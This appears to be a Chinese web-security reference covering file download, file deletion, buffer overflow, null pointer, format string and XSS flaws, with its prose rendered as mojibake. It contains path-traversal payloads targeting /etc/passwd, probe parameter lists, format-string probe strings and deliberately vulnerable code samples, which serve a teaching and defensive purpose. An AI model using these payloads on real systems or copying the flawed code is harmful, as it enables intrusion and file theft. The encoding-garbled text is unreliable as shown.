123456&lt;?php $filename = "uploads/abc.jpg"; header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$filename); header('Content-Lengh: '.filesize($filename));?&gt; â€‹ Payloadï¼š 12vul.php?file=/etc/passwdvul.php?file=../../../../../../../../etc/passwd æ£€æµ‹æ–¹æ³• 12345678910111213141516../æŽ¢æµ‹ï¼šdownload.php?filename=aa/../xxx.doc ../../../../etc/passwddownload.php?f=ï¬le:///etc/passwddownload.php?f=../ download.phpæ£€æµ‹ä»¥ä¸‹urlå‚æ•°ï¼š&amp;RealPath=&amp;FilePath=&amp;filepath=&amp;Path=&amp;path=&amp;inputFile=&amp;url=&amp;Lang=&amp;dis=&amp;data=&amp;readfile=&amp;src ä¿®å¤å»ºè®® å¯¹ä¸‹è½½è·¯å¾„è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚ä¸‹è½½å‰å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¹¶ä¸”å¯¹ä¸‹è½½æ–‡ä»¶ç±»åž‹è¿›è¡Œæ£€æŸ¥ï¼Œæ˜¯å¦æ˜¯å…è®¸ä¸‹è½½çš„ç±»åž‹ï¼Œå¦å¤–ç¦æ­¢ä½¿ç”¨å›žæº¯ç¬¦../ ï¼› æ­£åˆ™ä¸¥æ ¼åˆ¤æ–­ç”¨æˆ·è¾“å…¥å‚æ•°çš„æ ¼å¼ï¼› php.inié…ç½®open_basediré™å®šæ–‡ä»¶è®¿é—®èŒƒå›´ ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´žæè¿° æœªç»æŽˆæƒè®¿é—®è€…å¯ä»¥è¿›è¡Œåˆ é™¤æ–‡ä»¶ã€é™„ä»¶ã€å›¾ç‰‡ã€æ›¿æ¢ã€é…ç½®ç­‰ã€‚ æ¼æ´žå±å®³ æ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´žå¯ç›´æŽ¥åˆ é™¤Webç›®å½•ç”šè‡³æœåŠ¡å™¨ä¸Šä»»æ„æ ¼å¼æ–‡ä»¶ï¼Œç›´æŽ¥å¯¼è‡´ä¸šåŠ¡ç³»ç»Ÿä¸­æ–­ã€å´©æºƒã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šå­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤çš„ä»£ç ç¤ºä¾‹ï¼šæž„é€ æœåŠ¡å™¨ä¸Šå·²æœ‰æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹payloadï¼Œå³å¯åˆ é™¤ç›®æ ‡æœåŠ¡å™¨çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ã€‚ 123456789101112131415161718public function del()&#123; $dir = $this-&gt;input-&gt;get_post('id',true); if(empty($dir))&#123; getjson(L('plub_11')); &#125; $dirs = array(); if(!is_array($dir))&#123; $dirs[] = $dir; &#125;else&#123; $dirs = $dir; &#125; foreach($dirs as $dir) &#123; deldir(FCPATH.'attachment/backup/'.$dir); &#125; $info['msg'] = L('plub_12'); $info['url'] = site_url('basedb/restore').'?v='.rand(1000,9999); getjson($info,0); &#125; æ£€æµ‹æ–¹æ³• åˆ¤æ–­ä»£ç é‡Œæ˜¯å¦æœ‰è¿›è¡Œåˆ é™¤æ“ä½œçš„å‡½æ•°ï¼Œå¯¹æäº¤çš„å‚æ•°è¿›è¡Œç®€å•çš„åˆ¤æ–­ï¼Œç„¶åŽåœ¨è¾“å…¥çš„å‚æ•°æ‹¼æŽ¥æœåŠ¡å™¨ä¸Šå·²æœ‰æµ‹è¯•æ–‡ä»¶çš„ç›®å½•ï¼Œåˆ é™¤æˆåŠŸåˆ™è¡¨ç¤ºç›®æ ‡å­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´žã€‚ ä¿®å¤å»ºè®® é™åˆ¶æ–‡ä»¶åˆ é™¤å‡½æ•°å¯åˆ é™¤çš„ç›®å½•ä½ç½®ä»¥åŠæ–‡ä»¶ç±»åž‹ æ–‡ä»¶åéžç”¨æˆ·å¯æŽ§ ç¦æ­¢ä½¿ç”¨å›žæº¯ç¬¦../ ç¼“å†²åŒºæº¢å‡ºæ¼æ´žæè¿° ç¼“å†²åŒºæº¢å‡ºé”™è¯¯çš„ç‰¹å¾æ˜¯è¦†ç›–äº†è¿›ç¨‹çš„å†…å­˜ç‰‡æ®µï¼Œè¿™äº›å†…å­˜ç‰‡æ®µæ°¸è¿œä¸è¦æœ‰æ„æˆ–æ— æ„åœ°ä¿®æ”¹ã€‚IPï¼ˆæŒ‡ä»¤æŒ‡é’ˆï¼‰ï¼ŒBPï¼ˆåŸºæœ¬æŒ‡é’ˆï¼‰å’Œå…¶ä»–å¯„å­˜å™¨çš„å€¼è¦†ç›–ä¼šå¯¼è‡´å¼‚å¸¸ï¼Œåˆ†æ®µé”™è¯¯å’Œå…¶ä»–é”™è¯¯å‘ç”Ÿã€‚é€šå¸¸ï¼Œè¿™äº›é”™è¯¯ä¼šä»¥æ„å¤–çš„æ–¹å¼ç»ˆæ­¢åº”ç”¨ç¨‹åºçš„æ‰§è¡Œã€‚å½“æˆ‘ä»¬å¯¹charç±»åž‹çš„ç¼“å†²åŒºè¿›è¡Œæ“ä½œæ—¶ï¼Œä¼šå‘ç”Ÿç¼“å†²åŒºæº¢å‡ºé”™è¯¯ã€‚ç¼“å†²åŒºæº¢å‡ºå¯ä»¥åŒ…æ‹¬æº¢å‡ºå †æ ˆï¼ˆå †æ ˆæº¢å‡ºï¼‰æˆ–æº¢å‡ºå †ï¼ˆå †æº¢å‡ºï¼‰ã€‚ æ¼æ´žå±å®³ ç¼“å†²åŒºæº¢å‡ºé€šå¸¸ä¼šå¯¼è‡´å´©æºƒã€‚å¯¼è‡´ç¼ºä¹å¯ç”¨æ€§çš„å…¶ä»–æ”»å‡»ä¹Ÿæ˜¯å¯èƒ½çš„ï¼ŒåŒ…æ‹¬å°†ç¨‹åºç½®äºŽæ— é™å¾ªçŽ¯ä¸­ã€‚ ç¼“å†²åŒºæº¢å‡ºå¯ç”¨äºŽæ‰§è¡Œä»»æ„ä»£ç ï¼Œè¿™é€šå¸¸è¶…å‡ºç¨‹åºéšå¼å®‰å…¨ç­–ç•¥çš„èŒƒå›´ã€‚ å½“åŽæžœæ˜¯æ‰§è¡Œä»»æ„ä»£ç æ—¶ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨å®ƒæ¥é¢ è¦†ä»»ä½•å…¶ä»–å®‰å…¨æœåŠ¡ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šç¼“å†²åŒºå¤§å°æ˜¯å›ºå®šçš„ï¼Œä½†ä¸èƒ½ä¿è¯argv [1]ä¸­çš„å­—ç¬¦ä¸²ä¸ä¼šè¶…è¿‡è¯¥å¤§å°å¹¶å¼•èµ·æº¢å‡ºã€‚ 12345#define BUFSIZE 256int main(int argc, char **argv) &#123;char buf[BUFSIZE];strcpy(buf, argv[1]);&#125; æ£€æµ‹æ–¹æ³• åœ¨æ£€æŸ¥ä»£ç ä¸­æ˜¯å¦å­˜åœ¨å †æ ˆæº¢å‡ºæ—¶ï¼Œå»ºè®®æœç´¢å¯¹ä¸å®‰å…¨çš„åº“å‡½æ•°ï¼ˆå¦‚gets()ï¼Œstrcpy()ï¼Œstrcat()ç­‰ï¼‰çš„è°ƒç”¨ï¼Œè¿™äº›å‡½æ•°ä¸ä¼šéªŒè¯æºå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¹¶ç›²ç›®åœ°å°†æ•°æ®å¤åˆ¶åˆ°å›ºå®šå¤§å°çš„ç¼“å†²åŒºä¸­ã€‚ å½“å°†å¯å˜å¤§å°çš„æ•°æ®å¤åˆ¶åˆ°ä½äºŽç¨‹åºå †æ ˆä¸Šçš„å›ºå®šé•¿åº¦ç¼“å†²åŒºè€Œä¸è¿›è¡Œä»»ä½•è¾¹ç•Œæ£€æŸ¥æ—¶ï¼Œå°±ä¼šå‘ç”Ÿå †æ ˆæº¢å‡ºã€‚ OWASPæ£€æµ‹æ–¹æ¡ˆï¼š https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.2-Testing_for_Stack_Overflow.html https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.1-Testing_for_Heap_Overflow.html ä¿®å¤å»ºè®® ä¸ä½¿ç”¨strcpy()ã€sprintf()ç­‰ä¸å®‰å…¨çš„å‡½æ•°ï¼Œè€Œè¦åœ¨strncpy()ã€memcpy()ã€snprinf()çš„åŸºç¡€ä¸Šå°è£…å‡ºå®‰å…¨çš„å‡½æ•°ï¼Œå¯¹copyè¿›bufferçš„å†…å®¹å¤§å°è¿›è¡Œé™åˆ¶ï¼Œè¶…è¿‡å¤§å°åˆ™æˆªæ–­ã€‚ ç©ºæŒ‡é’ˆæ¼æ´žæ¼æ´žæè¿° Null Pointerç©ºæŒ‡é’ˆçš„å¼•ç”¨ï¼Œå¯¹äºŽç©ºæŒ‡é’ˆçš„é”™è¯¯å¼•ç”¨å¾€å¾€æ˜¯ç”±äºŽåœ¨å¼•ç”¨ä¹‹å‰æ²¡æœ‰å¯¹ç©ºæŒ‡é’ˆåšåˆ¤æ–­ï¼Œå°±ç›´æŽ¥ä½¿ç”¨ç©ºæŒ‡é’ˆï¼Œè¿˜æœ‰å¯èƒ½æŠŠç©ºæŒ‡é’ˆä½œä¸ºä¸€ä¸ªå¯¹è±¡æ¥ä½¿ç”¨ï¼Œé—´æŽ¥ä½¿ç”¨å¯¹è±¡ä¸­çš„å±žæ€§æˆ–æ˜¯æ–¹æ³•ï¼Œè€Œå¼•èµ·ç¨‹åºå´©æºƒï¼Œç©ºæŒ‡é’ˆçš„é”™è¯¯ä½¿ç”¨å¸¸è§äºŽç³»ç»Ÿã€æœåŠ¡ã€è½¯ä»¶æ¼æ´žæ–¹é¢ã€‚å½“åº”ç”¨ç¨‹åºå–æ¶ˆå¼•ç”¨å®ƒæœŸæœ›æ˜¯æœ‰æ•ˆçš„ä½†ä¸ºNULLçš„æŒ‡é’ˆæ—¶ï¼Œå°±ä¼šå‘ç”ŸNULLæŒ‡é’ˆå–æ¶ˆå¼•ç”¨ï¼Œé€šå¸¸ä¼šå¯¼è‡´å´©æºƒæˆ–é€€å‡ºã€‚ æ¼æ´žå±å®³ é€ æˆç¨‹åºçš„å´©æºƒï¼Œé€€å‡ºæˆ–é‡æ–°å¯åŠ¨ã€‚ æ‰§è¡Œæœªç»æŽˆæƒçš„ä»£ç æˆ–å‘½ä»¤ï¼›è¯»å–å†…å­˜ï¼›ä¿®æ”¹å†…å­˜ã€‚ åœ¨æžå°‘æ•°æƒ…å†µä¸‹ï¼Œå½“NULLç­‰äºŽ0x0å†…å­˜åœ°å€å¹¶ä¸”ç‰¹æƒä»£ç å¯ä»¥è®¿é—®å®ƒæ—¶ï¼Œå°±å¯ä»¥å†™å…¥æˆ–è¯»å–å†…å­˜ï¼Œè¿™å¯èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šä»¥ä¸‹æ­¥éª¤å°†ç¡®ä¿ç¨‹åºä¸å‘ç”Ÿç©ºæŒ‡é’ˆå–æ¶ˆå¼•ç”¨ã€‚ 1234if (pointer1 != NULL) &#123;/* make use of pointer1 *//* ... */&#125; åœºæ™¯2ï¼šåœ¨ä»¥ä¸‹ä»£ç ä¸­ï¼Œç¨‹åºå‘˜å‡å®šç³»ç»Ÿå§‹ç»ˆå®šä¹‰äº†åä¸ºâ€œcmdâ€çš„å±žæ€§ã€‚å¦‚æžœæ”»å‡»è€…å¯ä»¥æŽ§åˆ¶ç¨‹åºçš„çŽ¯å¢ƒï¼Œä»Žè€Œæœªå®šä¹‰â€œcmdâ€ï¼Œåˆ™å½“ç¨‹åºå°è¯•è°ƒç”¨trim()æ–¹æ³•æ—¶ï¼Œè¯¥ç¨‹åºå°†å¼•å‘NULLæŒ‡é’ˆå¼‚å¸¸ã€‚ 1234//Example Language: Java String cmd = System.getProperty("cmd");cmd = cmd.trim(); æ£€æµ‹æ–¹æ³• è‡ªåŠ¨åŒ–åŠ¨æ€åˆ†æžï¼šå¯ä»¥ä½¿ç”¨åŠ¨æ€å·¥å…·å’ŒæŠ€æœ¯æ¥æ£€æµ‹åˆ°æ­¤å¼±ç‚¹ï¼Œè¿™äº›å·¥å…·å’ŒæŠ€æœ¯å¯ä»¥ä½¿ç”¨å…·æœ‰å¤§é‡ä¸åŒè¾“å…¥çš„å¤§åž‹æµ‹è¯•å¥—ä»¶ä¸Žè½¯ä»¶è¿›è¡Œäº¤äº’ï¼Œä¾‹å¦‚æ¨¡ç³Šæµ‹è¯•ï¼ˆfuzzingï¼‰ï¼Œç¨³å®šæ€§æµ‹è¯•å’Œæ•…éšœæ³¨å…¥ã€‚è¯¥åº”ç”¨ç¨‹åºçš„æ“ä½œå¯èƒ½ä¼šå˜æ…¢ï¼Œä½†ä¸åº”å˜å¾—ä¸ç¨³å®šï¼Œå´©æºƒæˆ–äº§ç”Ÿé”™è¯¯çš„ç»“æžœã€‚ æ‰‹åŠ¨åŠ¨æ€åˆ†æžï¼šç¡®å®šæ­£å¸¸ä½¿ç”¨æœŸé—´ä¸å¤ªå¯èƒ½å‘ç”Ÿçš„é”™è¯¯æƒ…å†µå¹¶è§¦å‘å®ƒä»¬ã€‚ä¾‹å¦‚ï¼Œåœ¨å†…å­˜ä¸è¶³çš„æƒ…å†µä¸‹è¿è¡Œè¯¥ç¨‹åºï¼Œæ²¡æœ‰è¶³å¤Ÿçš„ç‰¹æƒæˆ–æƒé™è¿è¡Œè¯¥ç¨‹åºï¼Œåœ¨è¿›ç¨‹å®Œæˆä¹‹å‰ä¸­æ–­è¯¥è¿›ç¨‹ï¼Œæˆ–ç¦ç”¨ä¸ŽåŸºæœ¬ç½‘ç»œæœåŠ¡ï¼ˆä¾‹å¦‚DNSï¼‰çš„è¿žæŽ¥ï¼Œç›‘æŽ§åº”ç”¨ç¨‹åºæ˜¯å¦æœ‰æ„å¤–é”™è¯¯è¡Œä¸ºã€‚å¦‚æžœæ‚¨è§¦å‘äº†æœªå¤„ç†çš„å¼‚å¸¸æˆ–ç”±åº”ç”¨ç¨‹åºçš„çŽ¯å¢ƒå‘çŽ°å¹¶å¤„ç†çš„ç±»ä¼¼é”™è¯¯ï¼Œåˆ™å®ƒå¯èƒ½ä»æŒ‡ç¤ºåº”ç”¨ç¨‹åºæœ¬èº«æœªå¤„ç†çš„æ„å¤–æƒ…å†µã€‚ ä¿®å¤å»ºè®® å¦‚æžœåœ¨ä½¿ç”¨ä¹‹å‰å¯¹æ‰€æœ‰å¯èƒ½å·²ä¿®æ”¹çš„æŒ‡é’ˆè¿›è¡Œäº†å®Œæ•´æ€§æ£€æŸ¥ï¼Œåˆ™å¯ä»¥é˜²æ­¢å‡ ä¹Žæ‰€æœ‰çš„NULLæŒ‡é’ˆå–æ¶ˆå¼•ç”¨ã€‚ åœ¨è¿”å›žå€¼ä¹‹å‰ï¼Œè¯·æ£€æŸ¥æ‰€æœ‰è¿”å›žå€¼çš„å‡½æ•°çš„ç»“æžœï¼Œå¹¶éªŒè¯è¯¥å€¼æ˜¯å¦ä¸ºéžç©ºå€¼ã€‚ è¯†åˆ«æ‰€æœ‰ä»Žå¤–éƒ¨æ¥æºæŽ¥æ”¶ä¿¡æ¯çš„å˜é‡å’Œæ•°æ®å­˜å‚¨ï¼Œå¹¶åº”ç”¨è¾“å…¥éªŒè¯ä»¥ç¡®ä¿å®ƒä»¬ä»…è¢«åˆå§‹åŒ–ä¸ºæœŸæœ›å€¼ã€‚ åœ¨å£°æ˜Žè¿‡ç¨‹ä¸­æˆ–åœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæ˜¾å¼åˆå§‹åŒ–æ‰€æœ‰å˜é‡å’Œå…¶ä»–æ•°æ®å­˜å‚¨ã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žæè¿° å½“åº”ç”¨ç¨‹åºå°†è¾“å…¥å­—ç¬¦ä¸²çš„æäº¤æ•°æ®ä½œä¸ºå‘½ä»¤è¯„ä¼°æ—¶ï¼Œå°±ä¼šå‘ç”ŸFormat Stringæ”»å‡»ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»£ç ï¼Œè¯»å–å †æ ˆæˆ–åœ¨æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºä¸­å¼•èµ·åˆ†æ®µé”™è¯¯ï¼Œä»Žè€Œå¯¼è‡´å¯èƒ½æŸå®³ç³»ç»Ÿå®‰å…¨æ€§æˆ–ç¨³å®šæ€§çš„æ–°è¡Œä¸ºã€‚ æ¼æ´žå±å®³ å¦‚æžœæœåŠ¡å™¨ç«¯ä»£ç å°†ç”¨æˆ·è¾“å…¥ä¸Žæ ¼å¼å­—ç¬¦ä¸²è¿žæŽ¥åœ¨ä¸€èµ·ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šé™„åŠ å…¶ä»–è½¬æ¢è¯´æ˜Žç¬¦ï¼Œä»Žè€Œå¯¼è‡´è¿è¡Œæ—¶é”™è¯¯ï¼Œä¿¡æ¯æ³„éœ²æˆ–ç¼“å†²åŒºæº¢å‡ºã€‚ å¦‚æžœæ”»å‡»è€…é€šè¿‡ä¿®æ”¹æ ¼å¼å­—ç¬¦ä¸²æ¥åˆ©ç”¨è¿™äº›åŠŸèƒ½ï¼Œåˆ™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œä»£ç æ‰§è¡Œã€‚ æ”»å‡»æˆåŠŸå¯èƒ½é€ æˆä¿®æ”¹æ•°æ®ã€è¯»å–æ•°æ®ã€èŽ·å¾—æƒé™ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1: å¯¼è‡´æ ¼å¼å­—ç¬¦ä¸²æ¼æ´žçš„ä»£ç æ¨¡å¼æ˜¯å¯¹åŒ…å«æœªç»å¤„ç†çš„ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²æ ¼å¼å‡½æ•°çš„è°ƒç”¨ã€‚ä»¥ä¸‹ç¤ºä¾‹æ˜¾ç¤ºäº†è°ƒè¯•å¦‚ä½•printfä½¿ç¨‹åºæ˜“å—æ”»å‡»ï¼š Cä¸­çš„ç¤ºä¾‹ï¼š 1234char *userName = /* input from user controlled field */;printf("DEBUG Current user: ");//å­˜åœ¨æ¼æ´žçš„è°ƒè¯•ä»£ç printf(userName); Javaä¸­çš„ç¤ºä¾‹ï¼š 12345final String userName = /* input from user controlled field */;System.out.printf("DEBUG Current user: ");// å­˜åœ¨æ¼æ´žçš„ä»£ç :System.out.printf(userName); åœ¨æ­¤ç‰¹å®šç¤ºä¾‹ä¸­ï¼Œå¦‚æžœæ”»å‡»è€…å°†å…¶è®¾ç½®userNameä¸ºå…·æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªè½¬æ¢è¯´æ˜Žç¬¦ï¼Œåˆ™å°†å‡ºçŽ°æœ‰å®³çš„è¡Œä¸ºã€‚Cç¤ºä¾‹å°†æ‰“å°å‡ºå†…å­˜å†…å®¹ï¼ˆå¦‚æžœuserNameåŒ…å«ï¼‰%p%p%p%p%pï¼Œå¹¶ä¸”å¦‚æžœ%nå­—ç¬¦ä¸²ä¸­æœ‰aï¼Œå®ƒå¯èƒ½ä¼šç ´åå†…å­˜å†…å®¹ã€‚åœ¨Javaç¤ºä¾‹ä¸­ï¼ŒusernameåŒ…å«ä»»ä½•éœ€è¦è¾“å…¥ï¼ˆåŒ…æ‹¬%xæˆ–%sï¼‰çš„è¯´æ˜Žç¬¦çš„éƒ½ä¼šå¯¼è‡´å¯¼è‡´ç¨‹åºå´©æºƒIllegalFormatExceptionã€‚å°½ç®¡ç¤ºä¾‹ä»ç„¶å­˜åœ¨å…¶ä»–é—®é¢˜ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä½¿ç”¨printfå‚æ•°ä¿®å¤è¯¥æ¼æ´žprintf(&quot;DEBUG Current user: %s&quot;, userName)ã€‚ æ£€æµ‹æ–¹æ³• å­˜åœ¨æ¼æ´žçš„å…ˆå†³æ¡ä»¶ï¼šç›®æ ‡åº”ç”¨ç¨‹åºå¿…é¡»æŽ¥å—å­—ç¬¦ä¸²ä½œä¸ºç”¨æˆ·è¾“å…¥ï¼Œæ— æ³•æ¸…ç†ç”¨æˆ·è¾“å…¥ä¸­çš„å­—ç¬¦ä¸²æ ¼å¼å­—ç¬¦ï¼Œå¹¶ä½¿ç”¨è§£é‡Šå­—ç¬¦ä¸²æ ¼å¼å­—ç¬¦çš„å‡½æ•°æ¥å¤„ç†æ­¤å­—ç¬¦ä¸²ã€‚ é™æ€åˆ†æžå·¥å…·å¯ä»¥åœ¨ä»£ç æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°æ ¼å¼å­—ç¬¦ä¸²æ¼æ´žã€‚å·¥å…·ç¤ºä¾‹åŒ…æ‹¬ï¼š Cå’ŒC ++ï¼šFlawfinder Javaï¼šFindSecurityBugsè§„åˆ™FORMAT_STRING_MANIPULATION PHPï¼šphpsaä¸­çš„å­—ç¬¦ä¸²æ ¼å¼åˆ†æžå™¨ æ‰‹åŠ¨ä»£ç æ£€æŸ¥ï¼šé™æ€åˆ†æžå¯èƒ½ä¼šé”™è¿‡æ›´å¤æ‚çš„æƒ…å†µï¼ŒåŒ…æ‹¬å¤æ‚ä»£ç ç”Ÿæˆçš„æ ¼å¼å­—ç¬¦ä¸²ã€‚è¦åœ¨ä»£ç åº“ä¸­æ‰‹åŠ¨æŸ¥æ‰¾æ¼æ´žï¼Œæµ‹è¯•äººå‘˜å¯ä»¥åœ¨ä»£ç åº“ä¸­æŸ¥æ‰¾æ‰€æœ‰æŽ¥å—æ ¼å¼å­—ç¬¦ä¸²çš„è°ƒç”¨ï¼Œç„¶åŽå›žæº¯ä»¥ç¡®ä¿ä¸å—ä¿¡ä»»çš„è¾“å…¥æ— æ³•æ›´æ”¹æ ¼å¼å­—ç¬¦ä¸²ã€‚ æ‰‹åŠ¨æ³¨å…¥ï¼šæµ‹è¯•äººå‘˜å¯ä»¥ä½¿ç”¨Webæµè§ˆå™¨æˆ–å…¶ä»–Web APIè°ƒè¯•å·¥å…·æ‰§è¡Œæ‰‹åŠ¨æµ‹è¯•ã€‚æµè§ˆåˆ°Webåº”ç”¨ç¨‹åºæˆ–ç½‘ç«™ï¼Œä»¥ä½¿æŸ¥è¯¢å…·æœ‰è½¬æ¢è¯´æ˜Žç¬¦ã€‚è¯·æ³¨æ„ï¼Œå¦‚æžœå¤§å¤šæ•°è½¬æ¢è¯´æ˜Žç¬¦åœ¨URLä¸­å‘é€ï¼Œåˆ™éœ€è¦è¿›è¡Œç¼–ç ï¼Œå› ä¸ºå®ƒä»¬åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼ŒåŒ…æ‹¬%å’Œ{ã€‚è¯¥æµ‹è¯•å¯ä»¥%s%s%s%né€šè¿‡ä½¿ç”¨ä»¥ä¸‹URLæµè§ˆæ¥å¼•å…¥è¯´æ˜Žç¬¦å­—ç¬¦ä¸²ï¼š 1https://vulnerable_host/userinfo?username=%25s%25s%25s%25n â€‹ å¦‚æžœç½‘ç«™å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œåˆ™æµè§ˆå™¨æˆ–å·¥å…·åº”æ”¶åˆ°é”™è¯¯æ¶ˆæ¯ï¼Œå…¶ä¸­å¯èƒ½åŒ…æ‹¬è¶…æ—¶æˆ–HTTPè¿”å›žç 500ã€‚ â€‹ Javaä»£ç è¿”å›žé”™è¯¯ 1java.util.MissingFormatArgumentException: Format specifier '%s' æ ¹æ®`C`çš„å®žçŽ°ï¼Œè¯¥è¿‡ç¨‹å¯èƒ½ä¼šå®Œå…¨å´©æºƒ`Segmentation Fault`ã€‚ ä¿®å¤å»ºè®® é™åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°çš„ä½¿ç”¨ã€‚ è¾“å…¥éªŒè¯ï¼šå¿…é¡»å¯¹æ‰€æœ‰ç”¨æˆ·å¯æŽ§åˆ¶çš„è¾“å…¥è¿›è¡ŒéªŒè¯å¹¶è¿‡æ»¤æŽ‰éžæ³•æ ¼å¼å­—ç¬¦ã€‚ è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰æ¼æ´žæè¿° è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-site scriptingï¼Œç®€ç§°XSSæ”»å‡»ï¼‰ï¼Œé€šå¸¸å‘ç”Ÿåœ¨å®¢æˆ·ç«¯ï¼Œå¯è¢«ç”¨äºŽè¿›è¡Œéšç§çªƒå–ã€é’“é±¼æ¬ºéª—ã€å¯†ç å·å–ã€æ¶æ„ä»£ç ä¼ æ’­ç­‰æ”»å‡»è¡Œä¸ºã€‚XSSæ”»å‡»ä½¿ç”¨åˆ°çš„æŠ€æœ¯ä¸»è¦ä¸ºHTMLå’ŒJavascriptè„šæœ¬ï¼Œä¹ŸåŒ…æ‹¬VBScriptå’ŒActionScriptè„šæœ¬ç­‰ã€‚ æ¶æ„æ”»å‡»è€…å°†å¯¹å®¢æˆ·ç«¯æœ‰å±å®³çš„ä»£ç æ”¾åˆ°æœåŠ¡å™¨ä¸Šä½œä¸ºä¸€ä¸ªç½‘é¡µå†…å®¹ï¼Œç”¨æˆ·ä¸ç»æ„æ‰“å¼€æ­¤ç½‘é¡µæ—¶ï¼Œè¿™äº›æ¶æ„ä»£ç ä¼šæ³¨å…¥åˆ°ç”¨æˆ·çš„æµè§ˆå™¨ä¸­å¹¶æ‰§è¡Œï¼Œä»Žè€Œä½¿ç”¨æˆ·å—åˆ°æ”»å‡»ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œåˆ©ç”¨è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ”»å‡»è€…å¯çªƒå–ä¼šè¯cookieï¼Œä»Žè€ŒèŽ·å¾—ç”¨æˆ·çš„éšç§ä¿¡æ¯ï¼Œç”šè‡³åŒ…æ‹¬å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ã€‚ å­˜åœ¨ä¸‰ç§XSSç±»åž‹ï¼Œé€šå¸¸é’ˆå¯¹ç”¨æˆ·çš„æµè§ˆå™¨ï¼š åå°„å¼XSSï¼šåº”ç”¨ç¨‹åºæˆ–APIåŒ…æ‹¬æœªç»éªŒè¯å’Œæœªç»è½¬ä¹‰çš„ç”¨æˆ·è¾“å…¥ï¼Œä½œä¸ºHTMLè¾“å‡ºçš„ä¸€éƒ¨åˆ†ã€‚ä¸€ä¸ªæˆåŠŸçš„æ”»å‡»å¯ä»¥è®©æ”»å‡»è€…åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„çš„HTMLå’ŒJavaScriptã€‚ é€šå¸¸ï¼Œç”¨æˆ·å°†éœ€è¦ä¸ŽæŒ‡å‘æ”»å‡»è€…æŽ§åˆ¶é¡µé¢çš„æŸäº›æ¶æ„é“¾æŽ¥è¿›è¡Œäº¤äº’ï¼Œä¾‹å¦‚æ¶æ„æ¼æ´žç½‘ç«™ï¼Œå¹¿å‘Šæˆ–ç±»ä¼¼å†…å®¹ã€‚ å­˜å‚¨å¼XSSï¼šä½ çš„åº”ç”¨æˆ–è€…APIå°†æœªå‡€åŒ–çš„ç”¨æˆ·è¾“å…¥å­˜å‚¨ä¸‹æ¥äº†ï¼Œå¹¶åœ¨åŽæœŸåœ¨å…¶ä»–ç”¨æˆ·æˆ–è€…ç®¡ç†å‘˜çš„é¡µé¢å±•ç¤ºå‡ºæ¥ã€‚ å­˜å‚¨åž‹XSSä¸€èˆ¬è¢«è®¤ä¸ºæ˜¯é«˜å±æˆ–ä¸¥é‡çš„é£Žé™©ã€‚ åŸºäºŽDOMçš„XSSï¼šä¼šåŠ¨æ€çš„å°†æ”»å‡»è€…å¯æŽ§çš„å†…å®¹åŠ å…¥é¡µé¢çš„JavaScriptæ¡†æž¶ã€å•é¡µé¢ç¨‹åºæˆ–APIå­˜åœ¨è¿™ç§ç±»åž‹çš„æ¼æ´žã€‚ç†æƒ³çš„æ¥è¯´ï¼Œä½ åº”è¯¥é¿å…å°†æ”»å‡»è€…å¯æŽ§çš„æ•°æ®å‘é€ç»™ä¸å®‰å…¨çš„JavaScript APIã€‚ å…¸åž‹çš„XSSæ”»å‡»å¯å¯¼è‡´ç›—å–sessionã€è´¦æˆ·ã€ç»•è¿‡MFAã€DIVæ›¿æ¢ã€å¯¹ç”¨æˆ·æµè§ˆå™¨çš„æ”»å‡»ï¼ˆä¾‹å¦‚ï¼šæ¶æ„è½¯ä»¶ä¸‹è½½ã€é”®ç›˜è®°å½•ï¼‰ä»¥åŠå…¶ä»–ç”¨æˆ·ä¾§çš„æ”»å‡»ã€‚ æ¼æ´žå±å®³ ç½‘ç»œé’“é±¼ï¼ŒåŒ…æ‹¬ç›—å–å„ç±»ç”¨æˆ·è´¦å· çªƒå–ç”¨æˆ·cookieèµ„æ–™ï¼Œä»Žè€ŒèŽ·å–ç”¨æˆ·éšç§ä¿¡æ¯ï¼Œæˆ–åˆ©ç”¨ç”¨æˆ·èº«ä»½è¿›ä¸€æ­¥å¯¹ç½‘ç«™æ‰§è¡Œæ“ä½œ 